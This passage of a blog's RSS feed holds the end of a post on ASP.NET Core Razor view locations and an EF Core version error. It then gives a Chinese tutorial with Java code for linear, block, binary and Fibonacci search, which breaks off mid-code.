      &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt;[]
      {
        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/Views/{2}/Shared/{0}.cshtml&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/Views/{2}/{1}/{0}.cshtml&amp;#34;&lt;/span&gt;,
        &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/Views/Shared/{0}.cshtml&amp;#34;&lt;/span&gt;
      };
    }

    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt;[]
    {
      &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/Views/{1}/{0}.cshtml&amp;#34;&lt;/span&gt;,
      &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;/Views/Shared/{0}.cshtml&amp;#34;&lt;/span&gt;
    };
  }
  &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;void&lt;/span&gt; PopulateValues(ViewLocationExpanderContext context)
  {
  }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;在Startup注册我们的implement&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;services.AddMvc()
  .AddRazorOptions(options =&amp;gt; options.ViewLocationExpanders.Add(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ViewLocationExpander()));
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;reference-4&#34;&gt;Reference&lt;/h2&gt;
&lt;ol&gt;
&lt;li&gt;&lt;a href=&#34;https://www.c-sharpcorner.com/article/expanding-razor-view-location-and-sub-areas-in-asp-net-core/&#34;&gt;Expanding Razor View Location And Sub Areas In ASP.NET Core&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href=&#34;https://github.com/NonFactors/AspNetCore.Template/blob/378d64f6900f0cc95eee921b5caf81d2bc9efc11/src/MvcTemplate.Components/Mvc/Razor/ViewLocationExpander.cs&#34;&gt;AspNetCore.Template/src/MvcTemplate.Components/Mvc/Razor/ViewLocationExpander.cs&lt;/a&gt;&lt;/li&gt;
&lt;/ol&gt;
&lt;h1 id=&#34;error-the-database-provider-attempted-to-register-an-implementation&#34;&gt;Error: The database provider attempted to register an implementation&amp;hellip;&lt;/h1&gt;
&lt;blockquote&gt;
&lt;p&gt;The database provider attempted to register an implementation of the &amp;lsquo;IRelationalTypeMappingSource&amp;rsquo; service. This is not a service defined by EF and as such must be registered as a provider-specific service using the &amp;lsquo;TryAddProviderSpecificServices&amp;rsquo;&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;检查一下EF版本！！！&lt;/p&gt;
&lt;p&gt;You are mixing different versions of EF Core!!!&lt;/p&gt;
&lt;h2 id=&#34;reference-5&#34;&gt;Reference&lt;/h2&gt;
&lt;p&gt;&lt;a href=&#34;https://github.com/npgsql/efcore.pg/issues/1441&#34;&gt;Cannot register IRelationalTypeMappingSource #1441&lt;/a&gt;&lt;/p&gt;
- https://www.openheart.icu/cs/dot-net-issue/ - ALL RIGHTS RESERVED KRIS NIE</description>
        </item>
    
    
    
        <item>
        <title>Static Search Table &amp; Dynamic Search Table</title>
        <link>https://www.openheart.icu/cs/%E5%8A%A8%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%8E%E9%9D%99%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8/</link>
        <pubDate>Sat, 25 Jul 2020 18:32:23 +0000</pubDate>
        
        <guid>https://www.openheart.icu/cs/%E5%8A%A8%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%8E%E9%9D%99%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8/</guid>
        <description>42th openheart https://www.openheart.icu/cs/%E5%8A%A8%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8%E4%B8%8E%E9%9D%99%E6%80%81%E6%9F%A5%E6%89%BE%E8%A1%A8/ -&lt;p&gt;&lt;em&gt;今天在看&lt;code&gt;BST&lt;/code&gt;时，指导书上讲二叉排序树时与二分查找进行对比，引出几个模棱两可的概念（静态查找表、动态查找表），经查找后整理得本文&lt;/em&gt;&lt;/p&gt;
&lt;h1 id=&#34;概述&#34;&gt;概述&lt;/h1&gt;
&lt;p&gt;首先要了解几个基础概念&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查找(Searching)&lt;/strong&gt; 是根据给定的某个值，在查找表中确定一个其关键字等于给定值的数据元素。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;查找表(Search Table)&lt;/strong&gt; 是由同⼀类型的数据元素(记录)构成的集合。&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;关键字(Key)&lt;/strong&gt; 是数据元素中某个数据项的值，又称为键值，用它可以表示⼀个数据元素，也可以标识一个记录的某个数据项(字段)，我们称为关键码。
若关键字可以唯⼀地标识一个记录, 则称此关键字为&lt;strong&gt;主关键字 (Primary Key)&lt;/strong&gt;。
对于那些可以识别多个属于元素(记录)的关键字，我们称为&lt;strong&gt;次关键字(Secondary Key)&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;查找表操作可分为&lt;strong&gt;静态查找&lt;/strong&gt;和&lt;strong&gt;动态查找&lt;/strong&gt;。&lt;/p&gt;
&lt;h1 id=&#34;静态查找表static-search-table&#34;&gt;静态查找表(Static Search Table)&lt;/h1&gt;
&lt;p&gt;只作查找操作的查找表。&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;查询某个”特定的”数据元素是否在查找表中;&lt;/li&gt;
&lt;li&gt;检索某个&amp;quot;特定的&amp;quot;数据元素和各种属性;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;静态查找只是仅查找，并不会去改变集合内的数据元素。常用的查找有。&lt;/p&gt;
&lt;h2 id=&#34;顺序查找-linear-search又称线性查找&#34;&gt;顺序查找（ Linear search，又称线性查找）&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt; ：顺序查找就是按顺序从头到尾依次往下查找，从表中的第一个(或最后一个)记录开始，逐个进行记录关键字和给定值比较，找到数据，则提前结束查找，找不到便一直查找下去，直到数据最后一位&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;linearSearch&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] a, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; num) {        
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = 0; i &amp;lt; a.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt;; i++) {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(a[i] == num){
          	&lt;span style=&#34;color:#228b22&#34;&gt;// 返回数据所在的下标，也就是位置
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; i;
        }
    }
  	&lt;span style=&#34;color:#228b22&#34;&gt;// 不存在的话返回-1
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; -1;
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;索引顺序表查找分块查找&#34;&gt;索引顺序表查找（分块查找）&lt;/h2&gt;
&lt;p&gt;整个表中的元素未必有序，但若划分为若干块后，每一块中的所有元素均小于（或大于）其后面块中的所有元素。我们称这种为&lt;strong&gt;分块有序&lt;/strong&gt;。&lt;/p&gt;
&lt;p&gt;分块查找要求把一个数据分为若干块，每一块里面的元素可以是无序的，但是块与块之间的元素需要是有序的。（对于一个非递减的数列来说，第&lt;code&gt;i&lt;/code&gt;块中的每个元素一定比第&lt;code&gt;i-1&lt;/code&gt;块中的任意元素大）&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&lt;strong&gt;原理&lt;/strong&gt;：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;首先建立一个索引表，索引表中为每一块都设置索引项；&lt;/li&gt;
&lt;li&gt;在索引表中查找，目的是找出关键所属的块的位置。如果索引表较大的话，可以采用折半查找；&lt;/li&gt;
&lt;li&gt;进入该块中，使用简单顺序表查找算法进行关键字查找。&lt;/li&gt;
&lt;/ol&gt;
&lt;/blockquote&gt;
&lt;p&gt;这种带索引表的分块有序表查找的时间性能取决于两步查找时间之和：如前面所述，第一步可以采用简单顺序查找和折半查找之一进行。第二步只能采用简单顺序查找，但由于子表的长度较原表的长度小。因此，其时间性能介于顺序查找和折半查找之间。分块查找也同时有顺序查找和二分查找的优点：&lt;strong&gt;不需要有序&lt;/strong&gt;、&lt;strong&gt;速度快&lt;/strong&gt;。&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;BlockSearch&lt;/span&gt; {
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] index;
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; ArrayList&amp;lt;ArrayList&amp;lt;Integer&amp;gt;&amp;gt; list;
    
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;BlockSearch&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] index) {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;this&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;index&lt;/span&gt; = index;
        list = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;ArrayList&amp;lt;Integer&amp;gt;&amp;gt;();
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = 0; i &amp;lt; index.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt;; i++) {
            list.&lt;span style=&#34;color:#658b00&#34;&gt;add&lt;/span&gt;(&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; ArrayList&amp;lt;Integer&amp;gt;());
        }
    }
    
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;insert&lt;/span&gt;(Integer value) {
        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = binarySearch(value);
        list.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(i).&lt;span style=&#34;color:#658b00&#34;&gt;add&lt;/span&gt;(value);
    }
    
  	&lt;span style=&#34;color:#228b22&#34;&gt;// 分块查找
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;boolean&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;search&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; data) {
      	&lt;span style=&#34;color:#228b22&#34;&gt;// 二分查找所在块
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = binarySearch(data);
      	&lt;span style=&#34;color:#228b22&#34;&gt;// 顺序查找该元素
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; j = 0; j &amp;lt; list.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(i).&lt;span style=&#34;color:#658b00&#34;&gt;size&lt;/span&gt;(); j++) {
            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(data == list.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(i).&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(j)) {
                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;true&lt;/span&gt;;
            }
        }
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;false&lt;/span&gt;;
    }
  
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;printAll&lt;/span&gt;() {
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = 0; i &amp;lt; list.&lt;span style=&#34;color:#658b00&#34;&gt;size&lt;/span&gt;(); i++) {
            ArrayList&amp;lt;Integer&amp;gt; l = list.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(i);
            System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;ArrayList: &amp;#34;&lt;/span&gt; + i +  &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;:&amp;#34;&lt;/span&gt;);
            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; j = 0; j &amp;lt; l.&lt;span style=&#34;color:#658b00&#34;&gt;size&lt;/span&gt;(); j++) {
                System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(l.&lt;span style=&#34;color:#658b00&#34;&gt;get&lt;/span&gt;(j));
            }
        }
    }
  
    &lt;span style=&#34;color:#228b22&#34;&gt;// 二分查找
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;private&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;binarySearch&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; target) {
        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; start = 0;
        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; end = index.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt; - 1 ;
        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; mid = -1;
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt;(start &amp;lt;= end) {
            mid = (start + end) / 2;
            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(target == index[mid]) {
                &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; mid;
            }&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt;(target &amp;lt; index[mid]) {
                end = mid - 1;
            }&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
                start = mid + 1;
            }
        }
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; start;
    }
}
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h2 id=&#34;折半查找二分查找&#34;&gt;折半查找（二分查找）&lt;/h2&gt;
&lt;blockquote&gt;
&lt;p&gt;原理：首先确定该查找区间的中间点位置： int mid = (low+upper) / 2；然后将待查找的值与中间点位置的值比较：若相等，则查找成功并返回此位置。若中间点位置值大于待查值，则新的查找区间是中间点位置的左边区域。若中间点位置值小于待查值，则新的查找区间是中间点位置的右边区域。下一次查找是针对新的查找区间进行的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;binarySearch&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] nums, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; key) {
    &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; l = 0, h = nums.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt; - 1;
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;while&lt;/span&gt; (l &amp;lt;= h) {
        &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; m = l + (h - l) / 2;
        &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (nums[m] == key) {
            &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; m;
        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;if&lt;/span&gt; (nums[m] &amp;gt; key) {
            h = m - 1;
        } &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;else&lt;/span&gt; {
            l = m + 1;
        }
    }
    &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; -1;
}

&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;时间复杂度&#34;&gt;时间复杂度&lt;/h3&gt;
&lt;p&gt;二分查找也称为折半查找，每次都能将查找区间减半，这种折半特性的算法时间复杂度为 O(logN)。&lt;/p&gt;
&lt;h3 id=&#34;m-计算&#34;&gt;m 计算&lt;/h3&gt;
&lt;p&gt;有两种计算中值 m 的方式：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;m = (l + h) / 2&lt;/li&gt;
&lt;li&gt;m = l + (h - l) / 2&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;l + h 可能出现加法溢出，也就是说加法的结果大于整型能够表示的范围。但是 l 和 h 都为正数，因此 h - l 不会出现加法溢出问题。所以，最好使用第二种计算法方法，该方法又被称为&lt;strong&gt;差值查找&lt;/strong&gt;，是对二分查找的优化。&lt;/p&gt;
&lt;h3 id=&#34;未成功查找的返回值&#34;&gt;未成功查找的返回值&lt;/h3&gt;
&lt;p&gt;循环退出时如果仍然没有查找到 key，那么表示查找失败。可以有两种返回值：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;-1：以一个错误码表示没有查找到 key&lt;/li&gt;
&lt;li&gt;l：将 key 插入到 nums 中的正确位置&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;斐波那契查找&#34;&gt;斐波那契查找&lt;/h2&gt;
&lt;p&gt;除了上面的查找方法，还有一种方法，斐波那契查找（Fibonacci Search），它充分利用了黄金分割的原理，是一种特殊的折半查找方法。&lt;/p&gt;
&lt;p&gt;首先要准备一个斐波那契数列：
&lt;strong&gt;F = {0, 1, 1, 2, 3, 5, 8, 13, 21, &amp;hellip;}&lt;/strong&gt;
然后再准备一个供查询的数组：
a[11] = {0, 1, 16, 24, 35, 47, 59, 62, 73, 88, 99}&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;斐波拉契查找算法的核心在于&lt;/strong&gt;:&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;当&lt;code&gt;key = a[mid]&lt;/code&gt;时，表示查找成功;&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;key &amp;lt; a[mid]&lt;/code&gt;时，将斐波那契数列分割下标k减小1（&lt;code&gt;k=k-1&lt;/code&gt;）向左查找，新范围是第&lt;code&gt;low&lt;/code&gt;个到第新&lt;code&gt;mid-1&lt;/code&gt;个,此时范围个数为&lt;code&gt;F[k-1]-1&lt;/code&gt;个;&lt;/li&gt;
&lt;li&gt;当&lt;code&gt;key &amp;gt; a[mid]&lt;/code&gt;时，将斐波那契数列分割下标k减小2（&lt;code&gt;k=k-2&lt;/code&gt;）向右查找，新范围是第&lt;code&gt;mid+1&lt;/code&gt;个到第&lt;code&gt;high&lt;/code&gt;个. 此时范围个数为&lt;code&gt;F[K-2]-1&lt;/code&gt;个;&lt;/li&gt;
&lt;/ol&gt;
&lt;p&gt;首先需要计算出黄金分割点k，如上面a数组中除哨兵外元素个数n=10.&lt;/p&gt;
&lt;p&gt;根据已知条件，计算k值&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre style=&#34;background-color:#eed;-moz-tab-size:4;-o-tab-size:4;tab-size:4&#34;&gt;&lt;code class=&#34;language-java&#34; data-lang=&#34;java&#34;&gt;&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;class&lt;/span&gt; &lt;span style=&#34;color:#008b45;font-weight:bold&#34;&gt;FibonacciSearch&lt;/span&gt; {
 
	&lt;span style=&#34;color:#228b22&#34;&gt;/**
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 * @param args
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 */&lt;/span&gt;
	&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;final&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; MAXSIZE = 20;
 
	&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;void&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;main&lt;/span&gt;(String[] args) {
		&lt;span style=&#34;color:#228b22&#34;&gt;// TODO Auto-generated method stub
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] f = fibonacci();
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i : f) {
			System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;print&lt;/span&gt;(i + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34; &amp;#34;&lt;/span&gt;);
		}
		System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;();
 
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] data = { 1, 5, 15, 22, 25, 31, 39, 42, 47, 49, 59, 68, 88 };
 
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; search = 39;
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; position = fibonacciSearch(data, search);
		System.&lt;span style=&#34;color:#658b00&#34;&gt;out&lt;/span&gt;.&lt;span style=&#34;color:#658b00&#34;&gt;println&lt;/span&gt;(&lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;值&amp;#34;&lt;/span&gt; + search + &lt;span style=&#34;color:#cd5555&#34;&gt;&amp;#34;的元素位置为：&amp;#34;&lt;/span&gt; + position);
	}
 
	&lt;span style=&#34;color:#228b22&#34;&gt;/**
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 * 斐波那契数列
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 * 
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 * @return
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;	 */&lt;/span&gt;
	&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] &lt;span style=&#34;color:#008b45&#34;&gt;fibonacci&lt;/span&gt;() {
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] f = &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;new&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[20];
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = 0;
		f[0] = 1;
		f[1] = 1;
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;for&lt;/span&gt; (i = 2; i &amp;lt; MAXSIZE; i++) {
			f[i] = f[i - 1] + f[i - 2];
		}
		&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;return&lt;/span&gt; f;
	}
 
	&lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;public&lt;/span&gt; &lt;span style=&#34;color:#8b008b;font-weight:bold&#34;&gt;static&lt;/span&gt; &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; &lt;span style=&#34;color:#008b45&#34;&gt;fibonacciSearch&lt;/span&gt;(&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt;[] data, &lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; key) {
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; low = 0;
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; high = data.&lt;span style=&#34;color:#658b00&#34;&gt;length&lt;/span&gt; - 1;
		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; mid = 0;
		&lt;span style=&#34;color:#228b22&#34;&gt;// 斐波那契分割数值下标
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; k = 0;
		&lt;span style=&#34;color:#228b22&#34;&gt;// 序列元素个数
&lt;/span&gt;&lt;span style=&#34;color:#228b22&#34;&gt;&lt;/span&gt;		&lt;span style=&#34;color:#00688b;font-weight:bold&#34;&gt;int&lt;/span&gt; i = 0;
		&lt;span style=&#34;color:#228b22&#34;&gt;// 获取斐波那契数列
